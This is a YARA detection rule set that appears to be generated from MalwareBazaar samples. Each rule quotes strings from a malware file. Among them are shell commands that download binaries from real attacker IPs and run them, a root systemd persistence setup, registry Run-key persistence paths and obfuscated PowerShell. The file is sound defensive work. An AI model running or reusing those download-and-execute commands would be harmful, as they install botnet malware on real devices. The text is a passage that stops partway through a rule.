/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-11
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_079115c58dfb132f014d9ca557a9995546bd63d37af76f481b85918d8da15711 {
   meta:
      description = "evidences - file 079115c58dfb132f014d9ca557a9995546bd63d37af76f481b85918d8da15711.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "079115c58dfb132f014d9ca557a9995546bd63d37af76f481b85918d8da15711"
   strings:
      $s1 = "wget http://94.154.35.94/masjesuscan -O /etc/sweet/masjesuscan" fullword ascii
      $s2 = "apt-get install -y zmap" fullword ascii
      $s3 = "ExecStart=/etc/sweet/masjesuscan" fullword ascii
      $s4 = "WantedBy=multi-user.target" fullword ascii
      $s5 = "cat <<EOF > /etc/systemd/system/scan.service" fullword ascii
      $s6 = "mkdir -p /etc/sweet" fullword ascii
      $s7 = "systemctl enable scan.service" fullword ascii
      $s8 = "Description=Masjesu scan" fullword ascii
      $s9 = "systemctl start scan.service" fullword ascii
      $s10 = "User=root" fullword ascii
      $s11 = "chmod +x /etc/sweet/masjesuscan" fullword ascii
      $s12 = "Group=root" fullword ascii
      $s13 = "systemctl daemon-reload" fullword ascii
      $s14 = "apt-get update" fullword ascii
      $s15 = "rm scan.sh" fullword ascii
      $s16 = "Restart=always" fullword ascii
      $s17 = "WorkingDirectory=/etc/sweet/" fullword ascii
      $s18 = "RestartSec=5" fullword ascii
      $s19 = "[Install]" fullword ascii /* Goodware String - occured 2 times */
      $s20 = "[Service]" fullword ascii /* Goodware String - occured 2 times */
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      8 of them
}

rule dd3a620561b7e5176fc96a3b0c15ab96b86fa3e99217738c71c7b2ea3709f8fe {
   meta:
      description = "evidences - file dd3a620561b7e5176fc96a3b0c15ab96b86fa3e99217738c71c7b2ea3709f8fe.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "dd3a620561b7e5176fc96a3b0c15ab96b86fa3e99217738c71c7b2ea3709f8fe"
   strings:
      $s1 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/arc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s2 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/arm7    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s3 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/arm     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s4 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/mips    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s5 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/arm5    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s6 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/spc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s7 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/arm6    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s8 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/i686    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s9 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/sh4     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s10 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/ppc     -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s11 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/mpsl    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s12 = "cp /bin/busybox busybox; rm -rf o; curl http://103.163.215.73/m68k    -o o; chmod 777 o; ./o selfrep.curl" fullword ascii
      $s13 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x2123 and filesize < 3KB and
      8 of them
}

rule sig_08b9b7469cf772f2b3c74b5e782f6d8767c4327c3e9f2199b80b40fa62c15d0a {
   meta:
      description = "evidences - file 08b9b7469cf772f2b3c74b5e782f6d8767c4327c3e9f2199b80b40fa62c15d0a.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "08b9b7469cf772f2b3c74b5e782f6d8767c4327c3e9f2199b80b40fa62c15d0a"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "RVSPUWVS" fullword ascii
      $s3 = "NdRp]Zm[" fullword ascii
      $s4 = "\\7h)@}" fullword ascii
      $s5 = "5`vSIDW>" fullword ascii
      $s6 = "'1~4Nj" fullword ascii
      $s7 = "Nh[cj&" fullword ascii
      $s8 = "7tl ^p" fullword ascii
      $s9 = "fV}-`M" fullword ascii
      $s10 = "%EWK^F" fullword ascii
      $s11 = ";gK=5k" fullword ascii
      $s12 = "6L[=eCxx" fullword ascii
      $s13 = "8$? 'oQY" fullword ascii
      $s14 = "Af[q(F" fullword ascii
      $s15 = "r$%!uSgzU-" fullword ascii
      $s16 = "E*r9*ABp" fullword ascii
      $s17 = "NR`fdac>" fullword ascii
      $s18 = "9Cj}ak" fullword ascii
      $s19 = "PzB_Fy\\u" fullword ascii
      $s20 = "f#F_R?" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule sig_9c1f30e6fa0046e86606378ca020d487f0d50f1c25c04cff57a209debd760465 {
   meta:
      description = "evidences - file 9c1f30e6fa0046e86606378ca020d487f0d50f1c25c04cff57a209debd760465.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "9c1f30e6fa0046e86606378ca020d487f0d50f1c25c04cff57a209debd760465"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "RVSPUWVS" fullword ascii
      $s3 = "Qmqb\":" fullword ascii
      $s4 = "KbpRq/Y" fullword ascii
      $s5 = "8$? 'oQY" fullword ascii
      $s6 = "f#F_R?" fullword ascii
      $s7 = "B28q/M" fullword ascii
      $s8 = "$Info: " fullword ascii
      $s9 = "QgZ/|j" fullword ascii
      $s10 = "/=6Y=_W" fullword ascii
      $s11 = "Z/|N_-" fullword ascii
      $s12 = "1E#5bD" fullword ascii
      $s13 = "qp:IP!" fullword ascii
      $s14 = "BFi< Z" fullword ascii
      $s15 = "N<bUe h" fullword ascii
      $s16 = "l#wlXt" fullword ascii
      $s17 = "g_S6{V" fullword ascii
      $s18 = "4>*Wem" fullword ascii
      $s19 = "Ze9\"KH" fullword ascii
      $s20 = "k$$&`/es" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule sig_189dfabc8185899b0f71fcf992349f37c1f7fa9c17fb5cddbcfb6e9a44b707fe {
   meta:
      description = "evidences - file 189dfabc8185899b0f71fcf992349f37c1f7fa9c17fb5cddbcfb6e9a44b707fe.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "189dfabc8185899b0f71fcf992349f37c1f7fa9c17fb5cddbcfb6e9a44b707fe"
   strings:
      $s1 = "$Info: " fullword ascii
      $s2 = "C!3;^|" fullword ascii
      $s3 = "2chVV>" fullword ascii
      $s4 = "$,#.vS" fullword ascii
      $s5 = "wF_Zgp" fullword ascii
      $s6 = ",C+MhN+rC" fullword ascii
      $s7 = "/4g`^X#" fullword ascii
      $s8 = "@i<F_)" fullword ascii
      $s9 = "Ov7>l^l" fullword ascii
      $s10 = "-$>[)}" fullword ascii
      $s11 = "/2~:%=%p" fullword ascii
      $s12 = "o{BW4\"" fullword ascii
      $s13 = "'mLui[." fullword ascii
      $s14 = "Y\\|lHk" fullword ascii
      $s15 = " 3\\\\QB" fullword ascii
      $s16 = "Srzm$c" fullword ascii
      $s17 = "BR1|\"sBoH" fullword ascii
      $s18 = "^n0|p\\" fullword ascii
      $s19 = "u\"4<1&UH" fullword ascii
      $s20 = "a+b@'J" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule f934a8404562686e617283e32c37f30f83aa27994bc0dfe0fe61012376f421fd {
   meta:
      description = "evidences - file f934a8404562686e617283e32c37f30f83aa27994bc0dfe0fe61012376f421fd.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "f934a8404562686e617283e32c37f30f83aa27994bc0dfe0fe61012376f421fd"
   strings:
      $s1 = "qYef{ 4" fullword ascii
      $s2 = "(G.xRb)" fullword ascii
      $s3 = "d~1.FFM" fullword ascii
      $s4 = "$Info: " fullword ascii
      $s5 = "2chVV>" fullword ascii
      $s6 = "^n0|p\\" fullword ascii
      $s7 = "ML:}w'" fullword ascii
      $s8 = "3Ndd&]iz" fullword ascii
      $s9 = "H$6>,w" fullword ascii
      $s10 = "4Z=F?Tp" fullword ascii
      $s11 = "sa^$,T" fullword ascii
      $s12 = "Wv:nxo" fullword ascii
      $s13 = "*W%6I3" fullword ascii
      $s14 = "Mu;vgc" fullword ascii
      $s15 = "A<i;ZC" fullword ascii
      $s16 = "a*={=@" fullword ascii
      $s17 = "[0M3[6Jyfn" fullword ascii
      $s18 = "Nm4/PIJ" fullword ascii
      $s19 = "d}<-,:!" fullword ascii
      $s20 = "^VYMcx" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      8 of them
}

rule sig_6f45935bba1cffe43a4569dce556e74add4b88bd3cdc36520b2c4a2880e0f500 {
   meta:
      description = "evidences - file 6f45935bba1cffe43a4569dce556e74add4b88bd3cdc36520b2c4a2880e0f500.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "6f45935bba1cffe43a4569dce556e74add4b88bd3cdc36520b2c4a2880e0f500"
   strings:
      $s1 = "Exec failed: %s -c %s" fullword ascii
      $s2 = "udhcpc -R -n -p /var/run/udhcpc.%iface%.pid -i %iface%[[ -H %hostname%]][[ -c %client%]][[ -s %script%]][[ %udhcpc_opts%]]" fullword ascii
      $s3 = "Execute command, don't return to shell" fullword ascii
      $s4 = "tar -zcf /var/log/bootlog.tgz header %s *.log" fullword ascii
      $s5 = "user %s: process already running: %s" fullword ascii
      $s6 = "test -f /var/run/udhcpc.%iface%.pid && kill `cat /var/run/udhcpc.%iface%.pid` 2>/dev/null" fullword ascii
      $s7 = "ftp login: %s" fullword ascii
      $s8 = "Construct and run shell command" fullword ascii
      $s9 = "login failed" fullword ascii
      $s10 = "start-stop-daemon --stop -x wvdial -p /var/run/wvdial.%iface% -s 2" fullword ascii
      $s11 = "sulogin" fullword ascii
      $s12 = "mdev.log" fullword ascii
      $s13 = "start-stop-daemon --start -x wvdial -p /var/run/wvdial.%iface% -b -m --[[ %provider%]]" fullword ascii
      $s14 = "Executing %s %s" fullword ascii
      $s15 = "no process info in /proc" fullword ascii
      $s16 = "mprocessor" fullword ascii
      $s17 = "showing only processes with your user ID" fullword ascii
      $s18 = "compressed data not read from terminal, use -f to force it" fullword ascii
      $s19 = "info: processed: %s/%s" fullword ascii
      $s20 = "internal error - compression failed" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 5000KB and
      8 of them
}

rule sig_0f49f96812088f2b76c98c2577cb440b5aab22eed6577340c0023246fced462e {
   meta:
      description = "evidences - file 0f49f96812088f2b76c98c2577cb440b5aab22eed6577340c0023246fced462e.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "0f49f96812088f2b76c98c2577cb440b5aab22eed6577340c0023246fced462e"
   strings:
      $s1 = "PO-0005082025  pdf.exe" fullword ascii
      $s2 = "^*d:\\q" fullword ascii
      $s3 = "Q:\\m2N" fullword ascii
      $s4 = "jO:\"X>" fullword ascii
      $s5 = "'o\\eYeA^" fullword ascii
      $s6 = "J-6K`|* 5}" fullword ascii
      $s7 = "rSHgvy=" fullword ascii
      $s8 = "-'JSov`PF" fullword ascii
      $s9 = "MVwL}-P" fullword ascii
      $s10 = "GchbA_ y" fullword ascii
      $s11 = "^mVgrUG$Z" fullword ascii
      $s12 = "@zwDH](V" fullword ascii
      $s13 = "tgKfE\\U" fullword ascii
      $s14 = "NDgfIwY" fullword ascii
      $s15 = "wPey?6" fullword ascii
      $s16 = "GWvTD\"Gf`Fg" fullword ascii
      $s17 = "RhhUS\"6" fullword ascii
      $s18 = "GvDD\"V" fullword ascii
      $s19 = "%wrFw`gG" fullword ascii
      $s20 = "NpwTT\"7v`Ev" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule sig_21e1caaeb63ac4fe8001b8b1d89c6882d6833443ec6616ebdfb68daf60196327 {
   meta:
      description = "evidences - file 21e1caaeb63ac4fe8001b8b1d89c6882d6833443ec6616ebdfb68daf60196327.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "21e1caaeb63ac4fe8001b8b1d89c6882d6833443ec6616ebdfb68daf60196327"
   strings:
      $s1 = "android@android.com" fullword ascii
      $s2 = "res/layout/activity_login.xml" fullword ascii
      $s3 = "res/drawable/login.png" fullword ascii
      $s4 = "res/drawable/target.xml" fullword ascii
      $s5 = "res/layout/activity_login.xmlPK" fullword ascii
      $s6 = "res/drawable/bg_login_atas.xmlPK" fullword ascii
      $s7 = "res/drawable/bg_login_tele.xmlu" fullword ascii
      $s8 = "res/drawable/bg_login_atas.xmlu" fullword ascii
      $s9 = "res/drawable/login.pngPK" fullword ascii
      $s10 = "res/drawable/bg_login_tele.xmlPK" fullword ascii
      $s11 = "res/drawable/target.xmlPK" fullword ascii
      $s12 = "res/drawable/inject.pngPK" fullword ascii
      $s13 = "res/drawable/inject.png4zu\\S" fullword ascii
      $s14 = "res/layout/layout_download.xml" fullword ascii
      $s15 = "res/drawable-hdpi-v4/abc_list_selector_disabled_holo_dark.9.png" fullword ascii
      $s16 = "res/drawable-mdpi-v4/abc_text_select_handle_right_mtrl_dark.png" fullword ascii
      $s17 = "res/drawable/abc_item_background_holo_dark.xml" fullword ascii
      $s18 = "res/drawable-xxhdpi-v4/abc_list_selector_disabled_holo_dark.9.png" fullword ascii
      $s19 = "res/layout/float_logo.xml" fullword ascii
      $s20 = "res/drawable-hdpi-v4/abc_text_select_handle_middle_mtrl_dark.png" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 28000KB and
      8 of them
}

rule sig_533a9c0e91010b49c696492e53ba9af261c90e0645bb16e744b56fc47c3a7f17 {
   meta:
      description = "evidences - file 533a9c0e91010b49c696492e53ba9af261c90e0645bb16e744b56fc47c3a7f17.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "533a9c0e91010b49c696492e53ba9af261c90e0645bb16e744b56fc47c3a7f17"
   strings:
      $s1 = "android@android.com" fullword ascii
      $s2 = "004134452430" ascii /* hex encoded string 'A4E$0' */
      $s3 = "assets/icon/BypassPK" fullword ascii
      $s4 = "assets/icon/bypass.pngPK" fullword ascii
      $s5 = "assets/icon/Bypass" fullword ascii
      $s6 = "assets/icon/bypass.pngUz" fullword ascii
      $s7 = "assets/icon/dUMPK" fullword ascii
      $s8 = "lua/smtp.lua" fullword ascii
      $s9 = "lua/socket/headers.lua" fullword ascii
      $s10 = "android@android.com0" fullword ascii
      $s11 = "@pwwww" fullword ascii /* reversed goodware string 'wwwwp@' */
      $s12 = "res/xml/accessibility_service_config.xmlu" fullword ascii
      $s13 = "assets/icon/user.png" fullword ascii
      $s14 = "assets/icon/account.png" fullword ascii
      $s15 = "res/xml/accessibility_service_config.xmlPK" fullword ascii
      $s16 = "res/xml-v22/accessibility_service_config.xmlPK" fullword ascii
      $s17 = "res/xml-v22/accessibility_service_config.xmlu" fullword ascii
      $s18 = "lua/http.lua" fullword ascii
      $s19 = "font2.ttf" fullword ascii
      $s20 = "lua/import.lua" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 18000KB and
      8 of them
}

rule sig_225be70cbadaf9cef56f5b9a6a60289af33dd0687841df8d30f712c3551b2829 {
   meta:
      description = "evidences - file 225be70cbadaf9cef56f5b9a6a60289af33dd0687841df8d30f712c3551b2829.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "225be70cbadaf9cef56f5b9a6a60289af33dd0687841df8d30f712c3551b2829"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "get_loader_name_from_dll" fullword ascii
      $s8 = "Update.dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "process_config_directive" fullword ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "qgethostname" fullword ascii
      $s14 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s15 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s16 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s17 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s18 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s19 = ".TitleShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.DisplayNumeric sor" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule sig_66d77a5665c6652a7b0da7263989804361a583280aa1ae17e04ff1968714c18e {
   meta:
      description = "evidences - file 66d77a5665c6652a7b0da7263989804361a583280aa1ae17e04ff1968714c18e.img"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "66d77a5665c6652a7b0da7263989804361a583280aa1ae17e04ff1968714c18e"
   strings:
      $s1 = "Qdwrwxxe.exe" fullword wide
      $s2 = "get_KeyedBlocks" fullword ascii
      $s3 = "li9UQV316wRCU1T9piJOWla2hCVUUFX6qS8ccl3sgDhTR0HZtiVCWFr0vG1AUEzHgyNLWXb5qDMcWkjHjDhCRE35qT9TTAP/oCJ4eV32oiJPDn/9sQJeRV3etzlKfVn2" wide
      $s4 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s5 = "QDWRWXXE.EXE;1" fullword ascii
      $s6 = "Qdwrwxxe.exe;1" fullword wide
      $s7 = "KeyedBlock" fullword ascii
      $s8 = "keyedBlocks" fullword ascii
      $s9 = "ParseKeyedBlocks" fullword ascii
      $s10 = "set_KeyedBlocks" fullword ascii
      $s11 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii
      $s12 = "get_Pluralizers" fullword ascii
      $s13 = "get_SourceLiteral" fullword ascii
      $s14 = "get_SourceColumnNumber" fullword ascii
      $s15 = "get_OpenBraceCount" fullword ascii
      $s16 = "get_FormatterArguments" fullword ascii
      $s17 = "get_SourceSnippet" fullword ascii
      $s18 = "get_CloseBraceCount" fullword ascii
      $s19 = "get_BlockText" fullword ascii
      $s20 = "Jeffijoe.MessageFormat.Formatting.Formatters" fullword ascii
   condition:
      uint16(0) == 0x0000 and filesize < 4000KB and
      8 of them
}

rule f03d63f432db307cd33bf6098a034a637f4167f9b31a696995bf48b4403f2a96 {
   meta:
      description = "evidences - file f03d63f432db307cd33bf6098a034a637f4167f9b31a696995bf48b4403f2a96.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "f03d63f432db307cd33bf6098a034a637f4167f9b31a696995bf48b4403f2a96"
   strings:
      $s1 = "icomplete.exe" fullword ascii
      $s2 = "Cbziuoem.exe" fullword wide
      $s3 = "5Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" fullword ascii
      $s4 = "%InjectionPersist%" fullword ascii
      $s5 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s6 = "%HostIndex%" fullword ascii
      $s7 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii
      $s8 = "%Compress%" fullword ascii
      $s9 = "%HiddenKey%" fullword ascii
      $s10 = "%InstallationKey%" fullword ascii
      $s11 = "icompleted" fullword ascii
      $s12 = "-Software\\Microsoft\\Windows\\CurrentVersion\\Run" fullword ascii
      $s13 = "%InstallationFolder%" fullword ascii
      $s14 = "%StartupPersist%" fullword ascii
      $s15 = "%Message%" fullword ascii
      $s16 = "%StartupFolder%" fullword ascii
      $s17 = "%InstallationDirectory%" fullword ascii
      $s18 = "%InstallationReg%" fullword ascii
      $s19 = "%MainFile%" fullword ascii
      $s20 = "%Installation%" fullword ascii
   condition:
      uint16(0) == 0x0c2a and filesize < 900KB and
      8 of them
}

rule sig_386c3435b27451d4bd678e631befe2d8d7fa737eae70a7dfd007349fc53aead5 {
   meta:
      description = "evidences - file 386c3435b27451d4bd678e631befe2d8d7fa737eae70a7dfd007349fc53aead5.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "386c3435b27451d4bd678e631befe2d8d7fa737eae70a7dfd007349fc53aead5"
   strings:
      $s1 = "[System.Text.Encoding]::ascii.(([system.String]::new(@((-9020+(13934-4843)),(431068/(9614-5346)),(662-546),(62167/(3678339/4911)" ascii
      $s2 = "t04XK3m7R+QEfWbzPCVW6UTJ4rjDCkxNiX6GqXTOcTPATZaRnUx2ylNHVD2xEGK6P6vIQeXqjzzQTxnaeqTG+h3x7LYHORrLZy9Ed4oCEqGn8Vt80sbygQEkNDUmpvvw" ascii
      $s3 = "0edcMsAMjDaB8BompABvAXHXoPuORpvAycFHGEO8NaQnBvYNwgeU0R/UJfWnwhMcLPu5sVSpyejju7Ut3ZQhJaBYvWu5ccEW5XOYcUHj7TkLsRKnK4aPqYTkmMahCCWC" ascii
      $s4 = "$ebmtnuzspxwqhl=$executioncontext;$tionalonalattiontionisoresbearentionar = ([char[]]@((3085-(-4353+7385)),(224068/(-4451+8760))" ascii
      $s5 = "6))))),(28+(2787-2712))) -join ''))(($_ * (1500/(5539-(-4908+9697)))), (-5283+(8234-(5175-(-3025+(13552831/2581)))))))});$albeat" ascii
      $s6 = "w(2, 2 + 2))), ([math]::Pow(2, 2 + 2))) - 25)})).(([CHAR[]]@((-2606+2677),(-2736+(-7396+(4455+(-468+(38587788/(10752-4574))))))," ascii
      $s7 = "8QK1H9kQeTWu0oLBSvdH9MlhXpVXBbrt/WGLzM67NSPK+gOiOH81JFC3HBDQNcGV7KcNAD609g2TdP3j2r3joAEAhU8xRe1aa5fOXtuQ2E+PPRwu+tUBl1fmfavurXfz" ascii
      $s8 = "6R1Q/p2SAzyzt/ewoLbH5Yocrq6ul2hRxpTBKTCkXm4H3dSmS2n/bmpsUY/+EmIk8XBk9LfLiUt5sqU/uzfzVHBsMYlbGQqlrxCh+u3yy07m/NTlsMCUWRlnQCix5znS" ascii
      $s9 = "w1MCFTupKORBMAHWoiuBQA39NFw60fsnGCRhXCU+ahrfYt1dDmJi0mNZIPCJg0ScvbZ//aPGtR4Hn+P4bSC1Gz1qQAp+HChWFiaeLpD5LgISemZkunl0DPy/TfHh88Gq" ascii
      $s10 = "XCHLLig4QbEZfLsWn9AiT8NSMyTvgp/XlifkSxMzUPVl3V1xBRy0ccXC7ZSHF1qwbqO80ieyqv3GJZM7e1y/BX984Zrvuh2WJqoI7BoZK1jkjO1YfcMEdOSknlsdvL3a" ascii
      $s11 = "SBnE5wbTwd8dnL3vMNJSBC7XSiUxQrAZC/TmId/HMI5ppQ2+BKTGW35y7BGI+Mp/K8w5DH8Ai+C0mzE/d8KprfSMKDGSYg8rjmhgXwts1a1X9FwYTqMyuN3n6tUL82N3" ascii
      $s12 = "2Mmke0ksuKNVMHL959mBw8EnaABuUVcvRlP1tVKkzWduHHho4fjiTsPJCWxitN4UpMds2kmLuPPiylCsqvEjgNZMhZQc9kztRo+ghekRpT0KnIQVuHFhIJGgYoSWngdd" ascii
      $s13 = "Pvy1n3oyznHcNehK+fEooQppVwZLclcZtu9ULWIL6/pV0/qGTq0SiufvQUgLLr8jglqc3wxFL9BF2qtIwusGzPZ4sXrN0T56jJkhWAi4uBAwxiwl3SwhBw3L2KdyIypO" ascii
      $s14 = "QJnB96m46P6KMjFQ1fmnxVwLYWorc565HqyudsktBYu9o7VMQ7kg7DKCQTq4yKmNxQAuqt8LjnVsMbSTVINIhKZNorUzfqVF6ij+vcHgD8nq/NgPEr68K64v1HvuToW8" ascii
      $s15 = "AHdISgA7e2FBSV1FAWt2xjIgbEqjox/QlWx2Z0PKKHYJAj5UDnLGeJB7ITJt4NzVnOjjQ6ey4nJZRn92GWR8XT8CoDdKWoxxC0navhxzeWIuNOjGmiNi1yWmaji+elKZ" ascii
      $s16 = "qqsvZCufLBaDWj1hs8sVTe4wc1RzC3rgFAvHmzeuKVJ8Yj80e/lmSSkacIu4kBWBHvNs/RLTamfg2NmSkFiXShyHEz83UroUC7M+Ih0kwsaI5iDbnVwEJhEFZLPAthhn" ascii
      $s17 = "edK4/Mp6hyMwCwelHlcp3PO4M5qIrLEJVtHJPb+tC+x4GWe6Y3F+cH0izb8YVL3SlCZ97LdOq2MxMCdmRyucL/QH3EZrzoGswJ0D/jp//p0HI8DfLghRw2Bde4FcBgHU" ascii
      $s18 = "LOCMySiKPi/30lsra6edqmCQn3B4uS2Sj4JrvRcTy9C0TzjrUV+CglzhtggQiegZaumktlmSmJubyUkTxu7jNbY94/Mh1a4OhK3IIJ3h3w7A5LF3SS+5r5tOgl1kwf8Q" ascii
      $s19 = "zJ3O8QnmL+raXgDpfcqhODv+f2exvmqAb5kBSdbr4Ej7xbGR9X4otNl/PHOnrnu+hlE0ehYc+eQkjjN/tEWpD/6uCUjNhoQyXsa37YWXmIecBZbvmjvyK++A5jyotXa/" ascii
      $s20 = "rXRyWdZviOQ1/sUrNtwOhoenRFcLKUc2bs7Wtb4yV6qztsSa3NGj3cHjGhNyfcLFcy00avwgUzBRm1jpzAuGEAztGwbGIhuNmgnJs0N8UpAa8Xnwl8Hn6XhiqifIkBxd" ascii
   condition:
      uint16(0) == 0x6524 and filesize < 60KB and
      8 of them
}

rule sig_4601ffc4fc989f95e9ebd45d4ad656a27d0961cab237b8cc2eaeb779ea94f5a3 {
   meta:
      description = "evidences - file 4601ffc4fc989f95e9ebd45d4ad656a27d0961cab237b8cc2eaeb779ea94f5a3.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "4601ffc4fc989f95e9ebd45d4ad656a27d0961cab237b8cc2eaeb779ea94f5a3"
   strings:
      $s1 = "GPayment Notification Confirmation Documents 010_01_2025 Paper bills.exe" fullword ascii
      $s2 = ",jXhw.ZLU" fullword ascii
      $s3 = "vrE.rHZ" fullword ascii
      $s4 = "z9rAT{" fullword ascii
      $s5 = "Xmonopr" fullword ascii
      $s6 = "rtQqpw5" fullword ascii
      $s7 = "[P^p!." fullword ascii
      $s8 = "m -S)+" fullword ascii
      $s9 = "zZeHeS2" fullword ascii
      $s10 = "eJWRYwE9" fullword ascii
      $s11 = "cyvgew" fullword ascii
      $s12 = "t=H- 8M" fullword ascii
      $s13 = "iIYeo26" fullword ascii
      $s14 = "+ K`o&" fullword ascii
      $s15 = "w4+ 0fk" fullword ascii
      $s16 = "KMp%S%" fullword ascii
      $s17 = "7- TV2C" fullword ascii
      $s18 = "LjXHES4" fullword ascii
      $s19 = "otYqvC0" fullword ascii
      $s20 = "g.rsn~" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule sig_5c2fdf68ca9e702037410c43e4b9715480f9862fe5ecb51404bd9b6b9616a1a1 {
   meta:
      description = "evidences - file 5c2fdf68ca9e702037410c43e4b9715480f9862fe5ecb51404bd9b6b9616a1a1.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "5c2fdf68ca9e702037410c43e4b9715480f9862fe5ecb51404bd9b6b9616a1a1"
   strings:
